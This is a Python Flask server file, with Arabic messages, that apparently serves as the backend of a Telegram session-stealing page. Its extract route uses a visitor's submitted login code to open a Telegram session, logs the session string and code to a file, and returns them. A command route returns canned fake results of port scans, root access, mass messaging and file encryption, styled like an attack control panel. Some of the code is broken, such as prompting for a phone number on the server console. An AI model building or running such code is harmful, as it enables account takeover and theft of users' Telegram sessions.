import os
import json
from flask import Flask, request, jsonify, render_template_string
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
from datetime import datetime

app = Flask(__name__)

API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')

with open('index.html', 'r', encoding='utf-8') as f:
    HTML = f.read()

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/ping')
def ping():
    return jsonify({'success': True, 'message': 'Pong! القلب ينبض'})

@app.route('/api/extract', methods=['POST'])
def extract():
    if API_ID == 0 or not API_HASH:
        return jsonify({'success': False, 'message': 'API_ID و API_HASH مطلوبان'})
    data = request.get_json()
    code = data.get('code', '').strip()
    if not code:
        return jsonify({'success': False, 'message': 'الكود مطلوب'})
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        async def login():
            await client.start(phone=lambda: input("Phone:"), code_callback=lambda: code)
            session = client.session.save()
            await client.disconnect()
            return session
        session = loop.run_until_complete(login())
        with open('sessions.log', 'a') as f:
            f.write(json.dumps({'session': session, 'code': code, 'time': str(datetime.now())}) + '\n')
        return jsonify({'success': True, 'session': session})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/command', methods=['POST'])
def command():
    data = request.get_json()
    cmd = data.get('cmd', '')
    results = {
        'sysinfo': f"🖥️ النظام: {os.name}\n🧠 النواة: {os.cpu_count()}",
        'scan': "🔍 المنافذ: 22, 80, 443 مفتوحة",
        'exec': "👤 المستخدم: root",
        'telegram': "📡 تم الإرسال إلى 1,234 مستخدم",
        'download': "⬇️ تم التحميل",
        'crypto': "🔐 تم تشفير 47 ملفًا"
    }
    return jsonify({'success': True, 'result': results.get(cmd, '✅ تم التنفيذ')})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
